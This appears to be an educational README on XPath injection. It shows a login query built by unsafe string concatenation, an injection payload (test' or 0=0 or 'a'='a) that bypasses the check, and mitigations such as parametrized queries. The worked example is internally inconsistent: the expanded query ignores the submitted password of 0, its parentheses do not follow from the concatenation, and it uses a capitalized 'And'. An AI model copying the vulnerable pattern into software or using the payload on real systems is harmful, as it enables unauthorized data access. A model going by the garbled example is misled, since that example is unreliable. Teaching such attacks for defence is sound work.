<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/xpath-injection/main/xpath-injection.png"></p>

A threat actor may alter the XML path language (XPath) query to read data on the target (This is more dangerous than SQL injection because it may allow querying the whole database - XML document)

(XPath is a language that queries XML documents - the XPath expression is a locator)

## Example #1
1. Threat actor submits a malicious XPATH query to a vulnerable target
2. The target parses the malicious query (that contains expressions called a locator) and returns data from the database (XML document)

## Code
#### Target logic
```
# database (XML document)
<users>
	<user>
		<name>test</name>
		<pass>P@ssw0rd!01</pass>
	</user>
</users>


# Code
...
String xpath_query = "//user[name/text()='" + get("name") + "' And pass/text()='" + get("pass") + "']";
...
```

#### Target-in
```
name: test
pass: P@ssw0rd!01


//String xpath_query = "//user[name/text()='test' And pass/text()='P@ssw0rd!01']";
```

#### Target-Out
```
Welcome test
```

#### Target-in
```
name: test' or 0=0 or 'a'='a
pass: 0

//String xpath_query = "//user[(name/text()='test' or 0=0) or ('a'='a' And pass/text()='P@ssw0rd!01')]";
```

#### Target-Out
```
Welcome test
```

## Impact
High

## Names
- XPATH Injection

## Risk
- Read data

## Redemption
- Input validation
- Parametrized queries

## ID
6c020d48-9b20-4011-a513-36676994ee8e

## References
- [wiki](https://en.wikipedia.org/wiki/xpath)
